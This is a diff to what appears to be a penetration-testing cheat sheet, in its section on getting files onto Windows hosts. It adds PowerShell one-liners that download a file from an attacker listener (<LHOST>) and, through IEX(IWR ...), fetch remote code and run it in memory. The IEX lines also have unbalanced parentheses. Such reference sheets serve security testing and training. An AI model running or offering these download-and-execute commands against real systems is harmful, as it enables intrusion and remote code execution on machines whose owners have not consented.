@@ -687,7 +687,9 @@ PS C:\> powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE>
 
 ```c
 PS C:\> iwr <LHOST>/<FILE> -o <FILE>
+PS C:\> iwr <LHOST>/<FILE> -o <FILE> -useb
 PS C:\> IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing)
+PS C:\> IEX(IWR http://<LHOST>/<FILE>) -useb)
 ```
 
 ### FTP Server
